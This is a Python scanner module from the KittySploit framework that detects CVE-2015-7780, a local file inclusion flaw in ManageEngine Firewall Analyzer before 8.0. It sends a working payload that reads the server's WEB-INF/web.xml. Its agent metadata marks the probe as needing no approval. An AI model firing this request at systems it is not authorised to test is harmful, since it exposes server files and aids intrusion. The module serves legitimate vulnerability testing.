#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ManageEngine Firewall Analyzer before 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ManageEngine Firewall Analyzer <8.0 - Local File Inclusion Detection',
        'description': 'ManageEngine Firewall Analyzer before 8.0 is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'manageengine', 'edb', 'lfi', 'zohocorp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/35933',
            'http://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-000185.html',
            'http://jvn.jp/en/jp/JVN21968837/index.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-7780',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2015-7780',
    }

    def run(self):
        r = self.http_request(method="GET", path='/fw/mindex.do?url=./WEB-INF/web.xml%3f', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('</web-app>', 'java.sun.com',)
        header_any = ('application/xml',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="ManageEngine Firewall Analyzer <8.0 - Local File Inclusion detected",
                path='/fw/mindex.do?url=./WEB-INF/web.xml%3f',
            )
            return True
        return False

